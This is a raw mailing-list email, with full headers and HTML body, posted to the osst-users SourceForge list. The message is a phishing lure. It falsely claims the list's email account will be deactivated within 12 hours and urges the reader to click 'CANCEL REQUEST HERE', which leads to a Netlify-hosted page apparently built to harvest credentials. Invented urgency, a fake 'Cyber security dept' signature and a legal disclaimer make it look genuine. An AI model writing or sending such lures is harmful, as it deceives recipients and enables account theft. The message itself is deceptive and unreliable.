Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 0A0534AB691
	for <lists+osst-users@lfdr.de>; Mon,  7 Feb 2022 09:34:20 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1nGzTX-0007c9-Az
	for lists+osst-users@lfdr.de; Mon, 07 Feb 2022 08:34:17 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <support@securyit.me>) id 1nGzTV-0007aS-E0
 for osst-users@lists.sourceforge.net; Mon, 07 Feb 2022 08:34:16 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=hONMPSuiCB8a0MsoP/KsqXjSSUcCzaKoMtJSwuyjJe0=; b=nSyeP9ENyw1BdZ8zGMIOfBfu00
 OkrwIV9DPNLRU2z3OiV3OXUYdgL0vu6w7HDuB/jlQz00+Bsk1o6h8NQuyFVQr2SlPZuglC1Jai6FH
 00rBfvR3BhIc1ph224jZi7BYQVfNiM5ru4SsVqx8AlDHj0+NhTDLk61ZYIGkfAaojmQM=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=hONMPSuiCB8a0MsoP/KsqXjSSUcCzaKoMtJSwuyjJe0=; b=l
 nAsKIiCeqAeQXFDhizz/cDny7Atz/o01KBo8YiEzFYDDmUBQFuepvG8dHctBi73HUnFaln8XR15fA
 kW/1jdesXa5tl5/RPoy3WfUdQoNSKb6CQt2Y2IE4kOXh7iW8oYtZwpXlj4g4IKdRF3o+4yDZ+F/qj
 s4PqwXacj5J88pBg=;
Received: from vm3231222.24ssd.had.wf ([85.209.90.112] helo=mail0.securyit.me)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.94.2)
 id 1nGzTS-005Gp8-Vv
 for osst-users@lists.sourceforge.net; Mon, 07 Feb 2022 08:34:15 +0000
To: osst-users@lists.sourceforge.net
Date: 07 Feb 2022 00:33:59 -0800
Message-ID: <20220207003359.0DD593D29C73F7CE@lists.sourceforge.net>
MIME-Version: 1.0
X-Spam-Score: 2.3 (++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  lists.sourceforge.net Sender Action Required 
 Content analysis details:   (2.3 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.7 RCVD_IN_XBL            RBL: Received via a relay in Spamhaus XBL
 [85.209.90.112 listed in zen.spamhaus.org]
 0.2 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level
 mail domains are different
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
 0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
X-Headers-End: 1nGzTS-005Gp8-Vv
Subject: [Osst-users] Email Account De-activation Request
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
From: Admin Support Team via Osst-users <osst-users@lists.sourceforge.net>
Reply-To: Admin Support Team <server@lists.sourceforge.net>
Content-Type: multipart/mixed; boundary="===============0321783585826778530=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============0321783585826778530==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body>
<table style=3D"FONT-SIZE: 15px; MAX-WIDTH: 548px; FONT-FAMILY: &quot;Segoe=
 UI&quot;, &quot;Lucida Sans&quot;, sans-serif; WHITE-SPACE: normal; WORD-S=
PACING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: black; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0p=
x; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255=
,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-c=
aps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:=20
initial; text-decoration-style: initial; text-decoration-color: initial" ce=
llspacing=3D"0" cellpadding=3D"0" width=3D"548">
<TBODY>
<TR>
<td style=3D"PADDING-BOTTOM: 15px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
<table style=3D"MAX-WIDTH: 548px; HEIGHT: 101px; FONT-FAMILY: inherit; WIDT=
H: 543px; BORDER-COLLAPSE: collapse; FONT-WEIGHT: 600; PADDING-BOTTOM: 0px;=
 PADDING-TOP: 0px">
<TBODY>
<TR>
<td style=3D"FONT-FAMILY: &quot;segoe ui&quot;, frutiger, arial, sans-serif=
; WIDTH: 181px; VERTICAL-ALIGN: bottom"><SPAN class=3Dv1colour style=3D"COL=
OR: rgb(241,97,14)">lists.sourceforge.net</SPAN><BR></TD>
<td style=3D"FONT-FAMILY: &quot;segoe ui&quot;, frutiger, arial, sans-serif=
; WIDTH: 186px; VERTICAL-ALIGN: bottom; TEXT-ALIGN: center"><BR></TD>
<td style=3D"FONT-FAMILY: &quot;segoe ui&quot;, frutiger, arial, sans-serif=
; WIDTH: 181px; VERTICAL-ALIGN: bottom; TEXT-ALIGN: right"><BR></TD></TR>
<TR>
<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
arial, sans-serif; WIDTH: 181px; VERTICAL-ALIGN: middle; FONT-WEIGHT: 400; =
PADDING-BOTTOM: 0px; PADDING-TOP: 0px"><SPAN><SPAN class=3Dv1colour style=
=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseli=
ne; BORDER-BOTTOM-WIDTH: 0px; COLOR: black; PADDING-BOTTOM: 0px; PADDING-TO=
P: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDT=
H: 0px">Sender</SPAN></SPAN><BR></TD>
<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
arial, sans-serif; WIDTH: 186px; VERTICAL-ALIGN: middle; FONT-WEIGHT: 400; =
PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px"><BR></TD>
<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
arial, sans-serif; WIDTH: 181px; VERTICAL-ALIGN: middle; FONT-WEIGHT: 400; =
PADDING-BOTTOM: 0px; TEXT-ALIGN: right; PADDING-TOP: 0px"><SPAN><SPAN class=
=3Dv1colour style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTI=
CAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(192,0,0); PADDING=
-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIG=
HT: 0px; BORDER-TOP-WIDTH: 0px"><B>Action Required</B></SPAN>
 </SPAN><BR></TD></TR>
<TR>
<td style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADD=
ING-RIGHT: 0px" colspan=3D"3">
<table style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP=
: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" cellspacing=3D"0" cellpadding=
=3D"0">
<TBODY>
<TR height=3D10>
<td style=3D"FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 180px; PADDING-BOTTOM: 0p=
x; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 10px; PADDING-RIGHT: 0=
px" bgcolor=3D"#cccccc"><BR></TD>
<td style=3D"FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 4px; PADDING-BOTTOM: 0px;=
 PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 10px; PADDING-RIGHT: 0px=
" bgcolor=3D"white"><BR></TD>
<td style=3D"FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 180px; PADDING-BOTTOM: 0p=
x; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 10px; PADDING-RIGHT: 0=
px" bgcolor=3D"#cccccc"><BR></TD>
<td style=3D"FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 4px; PADDING-BOTTOM: 0px;=
 PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 10px; PADDING-RIGHT: 0px=
" bgcolor=3D"white"><BR></TD>
<td style=3D"FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 180px; PADDING-BOTTOM: 0p=
x; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 10px; PADDING-RIGHT: 0=
px" bgcolor=3D"#c00000"><BR></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
arial, sans-serif; WIDTH: 181px; FONT-WEIGHT: 400; PADDING-BOTTOM: 0px; PAD=
DING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px"><B=
R></TD>
<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
arial, sans-serif; WIDTH: 186px; FONT-WEIGHT: 400; PADDING-BOTTOM: 0px; TEX=
T-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 20px; PA=
DDING-RIGHT: 0px"><BR></TD>
<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
arial, sans-serif; WIDTH: 181px; FONT-WEIGHT: 400; PADDING-BOTTOM: 0px; TEX=
T-ALIGN: right; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 20px; PAD=
DING-RIGHT: 0px"><SPAN><SPAN class=3Dv1colour style=3D"BORDER-LEFT-WIDTH: 0=
px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH:=
 0px; COLOR: rgb(192,0,0); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-L=
EFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px">
<B>eMail Account Deactivation</B></SPAN></SPAN><BR></TD></TR></TBODY></TABL=
E></TD></TR>
<TR>
<td style=3D"WIDTH: 528px; PADDING-TOP: 0px; PADDING-LEFT: 10px; PADDING-RI=
GHT: 10px">
<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px">&nbsp;</DIV>
<table style=3D"HEIGHT: 333px; WIDTH: 537px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; MARGIN-LEFT: 0px; PADDING-RIGHT: 0px; BACKGROUN=
D-COLOR: rgb(242,245,250)">
<TBODY>
<TR>
<td style=3D"FONT-SIZE: 21px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
arial, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 10p=
x; PADDING-RIGHT: 10px">
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: inherit=
; BORDER-RIGHT-WIDTH: 0px; BORDER-TOP-COLOR: ; VERTICAL-ALIGN: baseline; BO=
RDER-BOTTOM-WIDTH: 0px; COLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; PADDING-=
TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WI=
DTH: 0px">
<table style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 11px; MAX-WIDTH: 680px; =
FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; BORDER-RIGHT-WIDTH: 0px=
; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(51,51,51); BORDER-TOP-WIDTH: 0px; BA=
CKGROUND-COLOR: rgb(244,244,244)" cellspacing=3D"0" cellpadding=3D"0" width=
=3D"680" border=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: Helvetica, Arial, sans-serif" he=
ight=3D"25" width=3D"680"><SPAN class=3Dv1size style=3D"FONT-SIZE: 10px">&n=
bsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; =
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;=
<SPAN>&nbsp;</SPAN><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px"><B>Closin=
g Of Email Address Notice !</B></SPAN></SPAN><BR></TD></TR>
<TR>
<td style=3D"BORDER-TOP: rgb(232,232,232) 2px solid; BORDER-RIGHT: rgb(232,=
232,232) 2px solid; BORDER-BOTTOM: rgb(255,108,44) 2px solid; PADDING-BOTTO=
M: 20px; PADDING-TOP: 15px; PADDING-LEFT: 0px; BORDER-LEFT: rgb(232,232,232=
) 2px solid; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255)">
<table style=3D"FONT-FAMILY: Helvetica, Arial, sans-serif" cellspacing=3D"0=
" cellpadding=3D"0" width=3D"680" border=3D"0">
<TBODY>
<TR>
<td width=3D"15"><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px"><BR></SPAN>=
</TD>
<td width=3D"650">
<table cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
<TBODY>
<TR>
<td>
<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px"><SPAN class=3Dv1size style=
=3D"FONT-SIZE: 13px"><SPAN>Attention&nbsp;osst-users ,<BR><BR>&#9888; We ha=
ve received your request to Deactivate your email account below, and the re=
quest will be concluded within 12hours from now.</SPAN><BR><BR></SPAN></DIV=
>
<table style=3D"MAX-WIDTH: 630px; BORDER-TOP: rgb(232,232,232) 2px solid; B=
ORDER-RIGHT: rgb(232,232,232) 2px solid; BORDER-BOTTOM: rgb(232,232,232) 2p=
x solid; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-L=
EFT: rgb(232,232,232) 2px solid; MARGIN: 5px 10px; PADDING-RIGHT: 0px" cell=
spacing=3D"0" cellpadding=3D"5">
<TBODY>
<TR>
<TH align=3Dleft><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px">Affected Em=
ail<SPAN>&nbsp;</SPAN></SPAN><BR></TH>
<td align=3D"left"><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px"><B>Accoun=
t Details</B></SPAN><BR></TD></TR>
<TR style=3D"BACKGROUND-COLOR: rgb(244,244,244)">
<TH align=3Dleft><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px">Domain :</S=
PAN></TH>
<td align=3D"left"><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px"><SPAN cla=
ss=3Dv1colour style=3D"COLOR: rgb(51,51,51)">lists.sourceforge.net</SPAN></=
SPAN></TD></TR>
<TR>
<TH align=3Dleft><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px">User&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<SPAN>&nbsp;</SPAN><SPAN=
>&nbsp;</SPAN></SPAN></TH>
<td align=3D"left"><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px">osst-user=
s</SPAN></TD></TR>
<TR style=3D"BACKGROUND-COLOR: rgb(244,244,244)">
<TH align=3Dleft><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px">Email&nbsp;=
&nbsp;&nbsp; :&nbsp;</SPAN><BR></TH>
<td align=3D"left"><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px">osst-user=
s@lists.sourceforge.net</SPAN></TD></TR>
<TR>
<TH align=3Dleft><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px">Time&nbsp;&=
nbsp;&nbsp;&nbsp; :</SPAN></TH>
<td align=3D"left"><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px">2/7/2022 =
12:33:59 a.m.</SPAN></TD></TR></TBODY></TABLE>
<DIV dir=3Dltr><SPAN class=3Dv1size style=3D"FONT-SIZE: 10px"><SPAN><SPAN c=
lass=3Dv1size style=3D"FONT-SIZE: 13px"><SPAN><SPAN class=3Dv1size style=3D=
"FONT-SIZE: 10px"><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px"><FONT size=
=3D3><BR>&nbsp;</FONT><A style=3D"COLOR: rgb(0,105,166)" href=3D"https://jo=
lly-lalande-05ed13-supportverify-servre-update.netlify.app/index.html#osst-=
users@lists.sourceforge.net" rel=3Dnoreferrer target=3D_blank><STRONG><FONT=
 size=3D3>CANCEL REQUEST&nbsp;HERE<SPAN>&nbsp;</SPAN></FONT></STRONG></A><F=
ONT size=3D3> </FONT>
<A style=3D"COLOR: rgb(0,105,166)" href=3D"https://jolly-lalande-05ed13-sup=
portverify-servre-update.netlify.app/index.html#osst-users@lists.sourceforg=
e.net" rel=3Dnoreferrer target=3D_blank><STRONG><FONT size=3D3>&#9654;</FON=
T></STRONG></A><STRONG><FONT size=3D3>&nbsp;&nbsp;</FONT>&nbsp;</STRONG></S=
PAN></SPAN></SPAN><BR><BR>
If you did not make this request or you made it by mistake or unknowingly, =
quickly take action above&nbsp;to stop this email termination process, but =
if you made this request kindly ignore this message as this account will be=
 terminated soon.</SPAN></SPAN></SPAN></DIV></TD></TR>
<TR>
<td>
<DIV style=3D"FONT-SIZE: 12px; BORDER-TOP: rgb(232,232,232) 2px solid; MARG=
IN-TOP: 5px; COLOR: rgb(102,102,102); PADDING-TOP: 5px">
<DIV style=3D"BORDER-TOP: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDI=
NG-LEFT: 0px; MARGIN: 5px 0px 0px; PADDING-RIGHT: 0px" dir=3Dltr><SPAN><SPA=
N class=3Dv1size style=3D"FONT-SIZE: 10px"><SPAN class=3Dv1size style=3D"FO=
NT-SIZE: 13px"><STRONG><BR></STRONG></SPAN></SPAN></SPAN><BR></DIV>
<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
GIN: 5px 0px 0px; PADDING-RIGHT: 0px"><SPAN class=3Dv1size style=3D"FONT-SI=
ZE: 13px"><B><SPAN class=3Dv1colour style=3D"COLOR: rgb(204,0,0)">Note:<SPA=
N>&nbsp;</SPAN></SPAN></B><SPAN class=3Dv1colour style=3D"COLOR: rgb(0,0,25=
5)"> If you fail to cancel this process above, we advise you to backup your=
 mails and contacts as you will lose all your messages and contacts when th=
is email "osst-users@lists.sourceforge.net" account termination is conclude=
d.</SPAN>
 </SPAN><BR></DIV></DIV>
<DIV dir=3Dltr><SPAN class=3Dv1size style=3D"FONT-SIZE: 10px"><SPAN>&copy;l=
ists.sourceforge.net</SPAN></SPAN><BR></DIV></TD></TR></TBODY></TABLE></TD>=

<td width=3D"15"><BR></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<td style=3D"PADDING-TOP: 10px" align=3D"center"><SPAN class=3Dv1size style=
=3D"FONT-SIZE: 10px"><SPAN><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px"><=
FONT size=3D1>Source: Administrator Support &copy;2022 Cyber security dept<=
/FONT></SPAN></SPAN></SPAN><BR></TD></TR></TBODY></TABLE></DIV></TD></TR>
<TR>
<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
arial, sans-serif; PADDING-BOTTOM: 6px; PADDING-TOP: 0px; PADDING-LEFT: 10p=
x; PADDING-RIGHT: 10px"></TD></TR>
<TR>
<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
arial, sans-serif; PADDING-BOTTOM: 6px; PADDING-TOP: 0px; PADDING-LEFT: 10p=
x; PADDING-RIGHT: 10px"></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
arial, sans-serif; PADDING-BOTTOM: 4px; PADDING-TOP: 10px"></TD></TR></TBOD=
Y></TABLE>
<P style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Lucida Grande", Verdana, Arial, =
Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFO=
RM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHA=
NS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255=
); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: nor=
mal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; te=
xt-decoration-style: initial;=20
text-decoration-color: initial'></P>
<DIV style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Lucida Grande", Verdana, Arial=
, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
FORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORP=
HANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,2=
55); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: n=
ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
text-decoration-style: initial;=20
text-decoration-color: initial'><SPAN class=3Dv1font style=3D'FONT-FAMILY: =
"Segoe UI", "Lucida Sans", sans-serif'><SPAN class=3Dv1colour style=3D"COLO=
R: rgb(153,153,153)"><SPAN class=3Dv1size style=3D"FONT-SIZE: 10px">
The information contained in or attached to this communication is intended =
solely for the use of the individual or entity to whom it is addressed and =
others authorized to receive it. It may contain confidential or legally pri=
vileged information. If you are not the intended recipient you are hereby n=
otified that any disclosure, copying, distribution or taking any action in =
reliance on the contents of this information is strictly prohibited and may=
 be unlawful. If you have received this=20
communication in error, please notify me immediately by responding to this =
email and then delete it from your system. We are neither liable for the pr=
oper and complete transmission of the information contained in this communi=
cation nor for any delay in its receipt.</SPAN>&nbsp;</SPAN></SPAN></DIV></=
BODY></HTML>


--===============0321783585826778530==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============0321783585826778530==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============0321783585826778530==--
